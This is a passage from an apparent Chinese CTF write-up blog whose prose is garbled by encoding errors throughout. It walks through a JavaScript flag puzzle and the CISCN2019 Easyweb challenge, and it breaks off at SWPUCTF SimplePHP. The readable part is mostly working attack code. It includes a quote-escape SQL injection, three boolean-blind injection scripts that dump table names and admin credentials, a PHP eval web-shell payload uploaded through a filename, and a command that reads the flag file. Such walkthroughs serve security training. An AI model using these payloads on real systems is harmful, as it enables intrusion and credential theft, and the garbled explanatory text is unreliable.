<span class="hljs-string">&quot;/die/&quot;</span>;<span class="hljs-comment">//é¡µé¢è·³è½¬åˆ°die</span><br>&#125;<br><br><span class="hljs-title function_">dietimer</span>();<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹çœ‹<code>chase</code>é¡µé¢ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-params">ms</span>) &#123;<br>       <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(resolve, ms));<br>     &#125;<br><br>     <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">dietimer</span>(<span class="hljs-params"></span>) &#123;<br>       <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">1000</span>);<br>       <span class="hljs-title function_">die</span>();<br>     &#125;<br><br>     <span class="hljs-keyword">function</span> <span class="hljs-title function_">die</span>(<span class="hljs-params"></span>) &#123;<br>       <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/die/&quot;</span>;<br>     &#125;<br><br>     <span class="hljs-keyword">function</span> <span class="hljs-title function_">left</span>(<span class="hljs-params"></span>) &#123;<br>       <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/die/&quot;</span>;<br>     &#125;<br><br>     <span class="hljs-keyword">function</span> <span class="hljs-title function_">leftt</span>(<span class="hljs-params"></span>) &#123;<br>       <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/leftt/&quot;</span>;<br>     &#125;<br><br>     <span class="hljs-keyword">function</span> <span class="hljs-title function_">right</span>(<span class="hljs-params"></span>) &#123;<br>       <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/die/&quot;</span>;<br>     &#125;<br><br>     <span class="hljs-title function_">dietimer</span>();<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è·³è½¬åˆ°<code>leftt</code>ï¼š</p><p><img src="/img/welcometoearth2.png" alt="welcometoearth2"></p><p>è·³è½¬åˆ°<code>/shoot/</code>:</p><p><img src="/img/welcometoerath3.png" alt="welcometoerath3"></p><p>è·³è½¬åˆ°<code>/door</code>ï¼Œæ˜¯è¿™ä¹ˆä¸ªä¸œè¥¿:</p><p><img src="/img/welcometoooooooooooooooooooearth4.png" alt="welcometoooooooooooooooooooearth4"></p><p>å¤§è‡´å°±æ˜¯é€‰æ‹©ä¸€ä¸ªæ•°å­—ï¼Œé€‰é”™äº†å°±è·³è½¬åˆ°<code>/die/</code>ç•Œé¢</p><p>ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯è¦çˆ†ç ´ã€‚ã€‚ä½†çœ‹äº†ä¼šå„¿å‘ç°ä¸çŸ¥é“æ€ä¹ˆæäº¤çš„è¿™ä¸ªå‚æ•°ï¼Œçœ‹æºç å‘ç°æœ‰è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><p><code>/static/js/door.js</code>ï¼Œè®¿é—®ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">check_door</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> all_radio = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;door_form&quot;</span>).<span class="hljs-property">elements</span>;<br>  <span class="hljs-keyword">var</span> guess = <span class="hljs-literal">null</span>;<br><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; all_radio.<span class="hljs-property">length</span>; i++)<br>    <span class="hljs-keyword">if</span> (all_radio[i].<span class="hljs-property">checked</span>) guess = all_radio[i].<span class="hljs-property">value</span>;<br><br>  rand = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">360</span>);<br>  <span class="hljs-keyword">if</span> (rand == guess) <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/open/&quot;</span>;<br>  <span class="hljs-keyword">else</span> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/die/&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¤§è‡´æ„æ€å°±æ˜¯çŒœæ•°ï¼Œä»–è¿™ä¸ªåº”è¯¥æ²¡æœ‰æ£€éªŒå•¥çš„ï¼Œæˆ‘ä»¬ç›´æ¥è·³è¿‡å»<code>open</code>ä¸‹çœ‹çœ‹ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-params">ms</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(resolve, ms));<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">open</span>(<span class="hljs-params">i</span>) &#123;<br>  <span class="hljs-title function_">sleep</span>(<span class="hljs-number">1</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title function_">open</span>(i + <span class="hljs-number">1</span>);<br>  &#125;);<br>  <span class="hljs-keyword">if</span> (i == <span class="hljs-number">4000000000</span>) <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/fight/&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç›´æ¥å»<code>fight</code>ï¼Œçœ‹æºç ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// Run to scramble original flag</span><br><span class="hljs-comment">//console.log(scramble(flag, action));</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">scramble</span>(<span class="hljs-params">flag, key</span>) &#123;<span class="hljs-comment">//flagä¼šè¢«æ··æ·†ï¼Œkeyæ˜¯æ··æ·†ç”¨çš„ç§˜é’¥</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; key.<span class="hljs-property">length</span>; i++) &#123;<br>    <span class="hljs-keyword">let</span> n = key.<span class="hljs-title function_">charCodeAt</span>(i) % flag.<span class="hljs-property">length</span>;<br>    <span class="hljs-keyword">let</span> temp = flag[i];<br>    flag[i] = flag[n];<br>    flag[n] = temp;<br>  &#125;<br>  <span class="hljs-keyword">return</span> flag;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">check_action</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> action = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;action&quot;</span>).<span class="hljs-property">value</span>;<br>  <span class="hljs-keyword">var</span> flag = [<span class="hljs-string">&quot;&#123;hey&quot;</span>, <span class="hljs-string">&quot;_boy&quot;</span>, <span class="hljs-string">&quot;aaaa&quot;</span>, <span class="hljs-string">&quot;s_im&quot;</span>, <span class="hljs-string">&quot;ck!&#125;&quot;</span>, <span class="hljs-string">&quot;_baa&quot;</span>, <span class="hljs-string">&quot;aaaa&quot;</span>, <span class="hljs-string">&quot;pctf&quot;</span>];<br><br>  <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> unscramble function</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸€ä¸ª<code>for</code>å¾ªç¯æ¥éå†å¯†é’¥çš„æ¯ä¸ªå­—ç¬¦ã€‚åœ¨æ¯æ¬¡è¿­ä»£ä¸­ï¼Œå®ƒé€šè¿‡<code>key.charCodeAt(i)</code>è·å–å¯†é’¥å­—ç¬¦çš„ASCIIç ï¼Œå¹¶å°†å…¶ä¸åŸå§‹æ ‡å¿—çš„é•¿åº¦å–æ¨¡ï¼Œå¾—åˆ°ä¸€ä¸ªç´¢å¼•å€¼<code>n</code>ã€‚ç„¶åï¼Œå®ƒä½¿ç”¨ä¸€ä¸ªä¸´æ—¶å˜é‡<code>temp</code>æ¥ä¿å­˜åŸå§‹æ ‡å¿—ä¸­çš„ç¬¬<code>i</code>ä¸ªå­—ç¬¦ã€‚æ¥ä¸‹æ¥ï¼Œå®ƒå°†åŸå§‹æ ‡å¿—ä¸­çš„ç¬¬<code>i</code>ä¸ªå­—ç¬¦æ›¿æ¢ä¸ºåŸå§‹æ ‡å¿—ä¸­çš„ç¬¬<code>n</code>ä¸ªå­—ç¬¦ï¼Œå¹¶å°†åŸå§‹æ ‡å¿—ä¸­çš„ç¬¬<code>n</code>ä¸ªå­—ç¬¦æ›¿æ¢ä¸º<code>temp</code>ã€‚è¿™æ ·å°±å®ç°äº†å¯¹åŸå§‹æ ‡å¿—çš„æ··æ·†ã€‚</p><p>ä¸‹é¢é‚£ä¸ªå°±æ˜¯è¢«æ‰“ä¹±é¡ºåºçš„<code>flag</code>ï¼Œè¦æŠŠå®ƒæ‹¼æˆæ­£ç¡®çš„é¡ºåºã€‚</p><p><code>pctf</code>çš„è¯è‚¯å®šæ”¾åœ¨ç¬¬ä¸€ä½ï¼Œç„¶åå°±æ˜¯<code>&#123;hey</code>ï¼Œä¸­é—´ä¸çŸ¥é“ï¼Œç»“å°¾æ˜¯<code>ck!&#125;</code></p><p>å‚è€ƒ<code>https://www.cnblogs.com/upfine/p/16542916.html</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> permutations<br><span class="hljs-keyword">import</span> re<br><br>flag = [<span class="hljs-string">&quot;&#123;hey&quot;</span>, <span class="hljs-string">&quot;_boy&quot;</span>, <span class="hljs-string">&quot;aaaa&quot;</span>, <span class="hljs-string">&quot;s_im&quot;</span>, <span class="hljs-string">&quot;ck!&#125;&quot;</span>, <span class="hljs-string">&quot;_baa&quot;</span>, <span class="hljs-string">&quot;aaaa&quot;</span>, <span class="hljs-string">&quot;pctf&quot;</span>]<br><span class="hljs-comment"># å¯¹flagå­—å…¸é‡Œçš„å†…å®¹è¿›è¡Œæ’åˆ—ç»„åˆ</span><br>item = permutations(flag) <span class="hljs-comment">#permutationså‡½æ•°é€šå¸¸ç”¨äºç”Ÿæˆç»™å®šé›†åˆçš„æ‰€æœ‰æ’åˆ—</span><br><span class="hljs-comment"># éå†</span><br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> item:<br>    k = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">list</span>(a))<br>    <span class="hljs-comment"># åŒ¹é…</span><br>    <span class="hljs-keyword">if</span> re.search(<span class="hljs-string">&#x27;^pctf\&#123;hey_boys[a-zA-z_]+ck!\&#125;$&#x27;</span>, k):<br>        <span class="hljs-built_in">print</span>(k)<br></code></pre></td></tr></table></figure><h2 id="CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb"><a href="#CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb"></a>[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb</h2><p><img src="/img/ciscneasyweb1.png" alt="ciscneasyweb1"></p><p>ç™»é™†ç•Œé¢ï¼Œå…ˆç”¨<code>dirsearch</code>æ‰«ï¼Œå‘ç°å­˜åœ¨<code>robots.txt</code>:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">User-agent</span><span class="hljs-punctuation">: </span>*<br><span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>*.php.bak<br></code></pre></td></tr></table></figure><p>ä¸è¿‡æ²¡å‘Šè¯‰æ˜¯å•¥ã€‚ã€‚çœ‹ä¸‹æºç ï¼Œæ³¨æ„ï¼š</p><p><img src="/img/ciscneasyweb3.png" alt="ciscneasyweb3"></p><p><code>image.php</code>è¿›å»å°±æ˜¯ä¸ªå›¾ç‰‡ï¼Œ<code>user.php</code>è¿›ä¸å»ï¼Œå›åˆ°<code>index.php</code>äº†ã€‚ç”¨è¿™ä¸‰ä¸ªæ–‡ä»¶è¯•è¯•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//image.php.bakï¼Œå¦å¤–ä¸¤ä¸ªæ²¡æœ‰</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;config.php&quot;</span>;<br><br><span class="hljs-variable">$id</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>]:<span class="hljs-string">&quot;1&quot;</span>;<br><span class="hljs-variable">$path</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>]:<span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$path</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$path</span>);<br><br><span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\\0&quot;</span>,<span class="hljs-string">&quot;%00&quot;</span>,<span class="hljs-string">&quot;\\&#x27;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>),<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$path</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\\0&quot;</span>,<span class="hljs-string">&quot;%00&quot;</span>,<span class="hljs-string">&quot;\\&#x27;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>),<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$path</span>);<br><br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-string">&quot;select * from images where id=&#x27;<span class="hljs-subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="hljs-subst">&#123;$path&#125;</span>&#x27;&quot;</span>);<br><span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$result</span>,MYSQLI_ASSOC);<br><br><span class="hljs-variable">$path</span>=<span class="hljs-string">&quot;./&quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;path&quot;</span>];<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: image/jpeg&quot;</span>);<br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$path</span>);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¯¹<code>id</code>è¿›è¡Œäº†ä¸¤æ¬¡å¤„ç†ï¼šç¬¬ä¸€æ¬¡<code>addslashes</code>ç¬¬äºŒæ¬¡<code>str_replace</code>ã€‚çœ‹äº†<code>wp</code>çŸ¥é“è¿™é‡Œå­˜åœ¨å•å¼•å·é€ƒé€¸çš„é—®é¢˜ï¼Œæ¯”å¦‚æˆ‘è¾“å…¥<code>\\0</code>ï¼Œå…ˆç»è¿‡<code>addslashes</code>ä¼šå˜æˆ<code>\\\\0</code>ï¼Œå…¶ä¸­<code>\\0</code>ä¼šè¢«æ›¿æ¢æˆç©ºå‰©<code>\\</code>ï¼Œè¿™ä¸œè¥¿ä¼šæŠŠåé¢ç´§è·Ÿçš„<code>&#39;</code>ç»™è½¬ä¹‰ï¼Œæ¯”å¦‚ï¼š</p><p><code>select * from iamges where id=&#39;\\&#39; or path=&#39; or 1=1 # &#39;</code></p><p>è¿™æ—¶<code>id</code>çš„å€¼æ˜¯<code>&#39; or path=</code>ï¼Œåé¢é‚£ä¸ªå•å¼•å·æ³¨é‡Šæ‰å°±è¡Œã€‚</p><p><code>/image.php?id=\\0&amp;path=or 1=1 %23</code></p><p><img src="/img/ciscneasyweb4.png" alt="ciscneasyweb4"></p><p><code>/image.php?id=\\0&amp;path=or 1=0 %23</code></p><p><img src="/img/ciscneasyweb5.png" alt="ciscneasyweb5"></p><p>å¸ƒå°”ç›²æ³¨ï¼Œå…ˆçœ‹çœ‹è¦æ€ä¹ˆåŒºåˆ†è¿™ä¸¤ä¸ªé¡µé¢(å…¶å®å°±æ˜¯id&#x3D;1å’Œid&#x3D;0)ï¼š</p><p><code>id=1</code></p><p><img src="/img/ciscneasyweb6.png" alt="ciscneasyweb6"></p><p><code>id=0</code></p><p><img src="/img/ciscneasyweb7.png" alt="ciscneasyweb7"></p><p>é€šè¿‡<code>JF</code>åŒºåˆ†å°±è¡Œ:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://3c0a9f91-d286-48a3-9bac-5dc484fbca9a.node4.buuoj.cn:81/image.php&quot;</span><br>result = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">30</span>):<br>    right = <span class="hljs-number">127</span><br>    left = <span class="hljs-number">32</span><br>    mid = (right + left)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> right &gt; left:<br>        payload = <span class="hljs-string">&quot; or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))&gt;%d,1,0)#&quot;</span> % (i, mid)<br>        params = &#123;<br>            <span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-string">&#x27;\\0&#x27;</span>,<br>            <span class="hljs-string">&#x27;path&#x27;</span>: payload<br>        &#125;<br>        response = requests.get(url, params=params)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;JF&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            left = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            right = mid<br>        mid = (right + left)//<span class="hljs-number">2</span><br><br>    result += <span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p><code> images,users</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://3c0a9f91-d286-48a3-9bac-5dc484fbca9a.node4.buuoj.cn:81/image.php&quot;</span><br>result = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">30</span>):<br>    right = <span class="hljs-number">127</span><br>    left = <span class="hljs-number">32</span><br>    mid = (right + left)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> right &gt; left:<br>        payload = <span class="hljs-string">&quot; or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),%d,1))&gt;%d,1,0)#&quot;</span> % (i, mid)<br>        params = &#123;<br>            <span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-string">&#x27;\\0&#x27;</span>,<br>            <span class="hljs-string">&#x27;path&#x27;</span>: payload<br>        &#125;<br>        response = requests.get(url, params=params)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;JFIF&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            left = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            right = mid<br>        mid = (right + left)//<span class="hljs-number">2</span><br><br>    result += <span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p>id,path,username,password</p><p>æ³¨æ„è¿™é‡Œä¸èƒ½ç›´æ¥â€™usersâ€™å› ä¸ºå•å¼•å·è¢«è¿‡æ»¤äº†ï¼Œè¦ä¹ˆç›´æ¥çˆ†åº“é‡Œçš„æ‰€æœ‰åˆ—åï¼Œè¦ä¹ˆå’Œå…¶å®ƒå¸ˆå‚…ä¸€æ ·æŠŠ<code>&#39;users&#39;</code>è¿™ä¸ªå­—ç¬¦ä¸²è½¬æ¢æˆåå…­è¿›åˆ¶ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://3c0a9f91-d286-48a3-9bac-5dc484fbca9a.node4.buuoj.cn:81/image.php&quot;</span><br>result = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">30</span>):<br>    right = <span class="hljs-number">127</span><br>    left = <span class="hljs-number">32</span><br>    mid = (right + left)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> right &gt; left:<br>        payload = <span class="hljs-string">&quot; or if(ascii(substr((select group_concat(username,password) from (users)),%d,1))&gt;%d,1,0)#&quot;</span> % (i, mid)<br>        params = &#123;<br>            <span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-string">&#x27;\\0&#x27;</span>,<br>            <span class="hljs-string">&#x27;path&#x27;</span>: payload<br>        &#125;<br>        response = requests.get(url, params=params)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;JFIF&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            left = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            right = mid<br>        mid = (right + left)//<span class="hljs-number">2</span><br><br>    result += <span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p>admin  8ef403207a4691e2271b</p><p>ç™»å½•ï¼š</p><p><img src="/img/ciscneastweb7.png" alt="ciscneastweb7"></p><p>ç›´æ¥ä¸Šä¼ <code>php</code>åç¼€çš„æŠ¥é”™äº†ï¼Œè¯•è¯•å…¶å®ƒåç¼€å‘ç°<code>phtml</code>çš„å¯ä»¥ï¼š</p><p><img src="/img/ciscneasyweb8.png" alt="ciscneasyweb8"></p><p>è®¿é—®<code>log/upload.19b6649eefbd2ed612b5e53d34e1a1c8.log.php</code></p><p><img src="/img/ciscneasyweb9.png" alt="ciscneasyweb9"></p><p>å¯ä»¥çœ‹åˆ°ä»–åªæ˜¯å•çº¯æŠŠæ–‡ä»¶åå­˜åˆ°è¿™ä¸ªæ—¥å¿—æ–‡ä»¶é‡Œäº†ï¼ŒçœŸæ­£ä¸Šä¼ åˆ°å“ªå»äº†æˆ‘ä¹Ÿæ²¡æ‰¾åˆ°ã€‚ã€‚</p><p>ä¸è¿‡è¿™ä¸ªæ—¥å¿—æ–‡ä»¶çš„åç¼€æ˜¯<code>.php</code>ï¼Œæ˜¯ä¸æ˜¯å¯ä»¥ç›´æ¥ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶åæ˜¯ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åæ²¡åç¼€çš„æ–‡ä»¶ï¼Ÿ</p><p>å‰é¢çŸ¥é“<code>php</code>è¿™ä¸œè¥¿å¤§å°å†™éƒ½è¢«è¿‡æ»¤äº†ï¼Œä¸è¿‡ä¸€å¥è¯è¿˜æœ‰å…¶å®ƒå†™æ³•ï¼Œæ¯”å¦‚:</p><p><code>&lt;?=@eval($_POST[&#39;a&#39;]);?&gt;</code></p><p><img src="/img/ciscneasyweb10.png" alt="ciscneasyweb10"></p><p>ä¼ å®Œäº†ç›´æ¥è®¿é—®å°±è¡Œï¼Œä¸è¿‡ä¸çŸ¥é“æ€ä¹ˆå›äº‹æˆ‘è¿™ä¸ªé¡µé¢å¹¶æ²¡æœ‰æˆ‘ä¸Šä¼ è¿™ä¸ªä¸œè¥¿çš„æ–‡ä»¶åï¼Ÿä½†å‘½ä»¤å¯ä»¥æ­£å¸¸æ‰§è¡Œ</p><p><img src="/img/ciscneasyweb12.png" alt="ciscneasyweb12"></p><p>POST<code>a=system(&#39;cat /flag&#39;);</code>å°±è¡Œ</p><h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p><img src="/img/simplephp1.png" alt="simplephp1"></p><p>å”‰ï¼Œå¥½åƒåˆæ˜¯æ–‡ä»¶ä¸Šä¼ </p><p><img src="/img/simplephp2.png" alt="simplephp2"></p><p>æºç ä¸­å­˜åœ¨æç¤ºï¼š<code>&lt;!--flag is in f1ag.php--&gt; </code></p><p>åŒæ—¶æ³¨æ„åˆ°<code>file.php?file=</code>è¿™ä¸œè¥¿ï¼Œæƒ³ç€ç”¨ä¼ªåè®®è¯»è¯»æºç å•¥çš„å‘ç°è¯»ä¸äº†ã€‚ã€‚ç›´æ¥è¾“è¿›å»åè€Œæœ‰å›æ˜¾ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 